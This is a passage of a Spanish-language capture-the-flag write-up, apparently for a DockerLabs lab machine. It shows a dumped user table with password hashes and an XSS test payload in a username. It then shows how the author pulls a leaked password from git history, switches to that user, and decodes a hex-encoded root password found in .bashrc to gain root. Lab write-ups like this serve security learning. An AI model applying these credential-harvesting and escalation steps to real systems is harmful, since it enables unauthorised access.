|  7 | Eduardo                       | $2y$10$Pv0A9MrBMJphE2J8t9ZZZu7f.hwq4MBq8ZRKqymAJbkF4eMAcDFey | Eduardo       | Felix    | lalomora@hotmail.com         | FG9S72K8   | Colonia Hernandez Monroy Av Eulalio #153 | 9784712841   |        7.00 | 46126168  |
|  8 | Andrea                        | $2y$10$Hvr0/KwEIQQaMmUCWbXZFujw3/Zg4AGXDx2BcbFiOY0Y7IfqhURnC | Andrea        | Casas    | andycc2@gmail.com            | F9S8GKA8   | Calle Av Universal Tamaulipas Centro #85 | 8237850302   |        7.00 | 34343017  |
|  9 | vaxei                         | $2y$10$IPffhz9cfTzFtRzBwFrapeare4J7HLYvfA3q/ZP8Xx9zRoBF8lQE6 | Vaxei         | Lopez    | usvaxei@gmail.com            | 938F8kG8   | Circuito del carmen #592 Bol             | 893858224    |      150.00 | 69878704  |
| 66 | admin                         | $2y$10$hX7a7qAbulmNFfgmDzJEPOlxZbzR3jpdIJbyglA56C4beY923B9tO | Administrador |          | edo_administracion@gmail.com |            |                                          |              | 14030327.00 | 99999999  |
| 68 | <script>alert'HELLO'</script> | $2y$10$gEPouBiZl68kV1wBNwGEzOUCiG82.bJRwZMhaqRikvXscmLbtLLuy | test          | test     | test@test.com                | 6547835483 | test                                     | 5784937543   |      150.00 | 91544880  |
+----+-------------------------------+--------------------------------------------------------------+---------------+----------+------------------------------+------------+------------------------------------------+--------------+-------------+-----------+
```

Pero no nos servira de mucho...

Si investigamos un poco mas en la carpeta de `html` veremos una bastante interesante llamada `desarrollo` en la que contiene un `git`, por lo que vemos que tenemos `git` instalado y podremos sacar informacion sensible de la siguiente forma.

```shell
git log
```

Si ingresamos eso nos va a dar el siguiente error:

```
To add an exception for this directory, call:

        git config --global --add safe.directory /var/www/html/desarrollo/.git
```

Pero si intentamos marcarlo como directorio seguro no nos va a dejar por lo que haremos lo siguiente:

```
export HOME=/tmp
git config --global --add safe.directory /var/www/html/desarrollo/.git
```

Ahora si que nos dejara listar los `logs`:

```shell
git log
```

Info:

```
commit e84b3048cf586ad10eb3194025ae9d57dac8b629 (HEAD -> master)
Author: developer <developer@example.com>
Date:   Mon Oct 14 07:47:14 2024 +0000

    Cambios en el panel de login

commit 1e3fe13e662dacb85056691d3afc932c16a1e3df
Author: sysadmin <sysadmin@example.com>
Date:   Mon Oct 14 07:46:57 2024 +0000

    Actualizaci<C3><B3>n de la versi<C3><B3>n de PHP

commit cd04778b50b131f5041bd7f9e6895741d6f4b98b
Author: editor <editor@example.com>
Date:   Mon Oct 14 07:46:43 2024 +0000

    Actualizaci<C3><B3>n de contenido en el panel de noticias

commit 0baffeec1777f9dfe201c447dcbc37f10ce1dafa
Author: adm <adm@example.com>
Date:   Mon Oct 14 07:44:17 2024 +0000

    Acceso a Remote Management

commit 2d5e983bab20c69c2f2ddc75a51720dbe60958e6
Author: Usuario Simulado <usuario.simulado@example.com>
Date:   Mon Oct 14 07:39:40 2024 +0000

    Registrar actividad sospechosa

commit e562db0b7923041980332e5988d94edf9a5df602
Author: Usuario Simulado <usuario.simulado@example.com>
Date:   Mon Oct 14 07:39:33 2024 +0000

    Registrar cambio en la configuraci<C3><B3>n del sistema

commit 837bdf4af4514bcdb218733cf21c4c192b87fe91
Author: Usuario Simulado <usuario.simulado@example.com>
Date:   Mon Oct 14 07:39:27 2024 +0000

    Registrar intento de acceso no autorizado

commit 9a36af726878b68de4f99fffb674ddfbe8c996ed
Author: Usuario Simulado <usuario.simulado@example.com>
Date:   Mon Oct 14 07:38:17 2024 +0000

    Actualizaci<C3><B3>n de notas y hash de contrase<C3><B1>a

commit a6641dd60da6558616acb478ade407d8351a3e57
Author: Usuario Simulado <usuario.simulado@example.com>
Date:   Mon Oct 14 07:32:29 2024 +0000

    Pago fraudulento reporte
```

Pero hay uno en concreto que nos interesa:

```
commit 0baffeec1777f9dfe201c447dcbc37f10ce1dafa
Author: adm <adm@example.com>
Date:   Mon Oct 14 07:44:17 2024 +0000

    Acceso a Remote Management
```

Por lo que vamos a investigar sobre ese `commit`.

```shell
git show 0baffeec1777f9dfe201c447dcbc37f10ce1dafa
```

Info:

```
commit 0baffeec1777f9dfe201c447dcbc37f10ce1dafa
Author: adm <adm@example.com>
Date:   Mon Oct 14 07:44:17 2024 +0000

    Acceso a Remote Management

diff --git a/remote_management_log.txt b/remote_management_log.txt
new file mode 100644
index 0000000..eafd8c6
--- /dev/null
+++ b/remote_management_log.txt
@@ -0,0 +1 @@
+Acceso a Remote Management realizado por 'adm' el Mon Oct 14 07:44:17 GMT 2024. Nueva contrase<C3><B1>a: 9fR8pLt@Q2uX7dM^sW3zE5bK8nQ@7pX
```

Vemos que nos aparece lo que es la nueva contraseña del usuario `adm`:

```
9fR8pLt@Q2uX7dM^sW3zE5bK8nQ@7pX
```

Por lo que si probamos hacer lo siguiente...

```shell
su adm
```

Metemos como contraseña `9fR8pLt@Q2uX7dM^sW3zE5bK8nQ@7pX` y veremos que seremos dicho usuario.

## Escalate Privileges

Si leemos el siguiente archivo:

```shell
cat .bashrc
```

Info:

```
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi
export MY_PASS='64 6f 63 6b 65 72 6c 61 62 73 34 75'

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

Vemos una linea interesante que seria la siguiente:

```
export MY_PASS='64 6f 63 6b 65 72 6c 61 62 73 34 75'
```

Parece ser que hay una contraseña en `hexadecimal`, por lo que vamos a pasarla a texto plano:

```
dockerlabs4u
```

Probaremos dicha contraseña con el usuario `root` y veremos que es la de dicho usuario.

```shell
su root
```

Metemos como contraseña `dockerlabs4u` y seremos `root`.
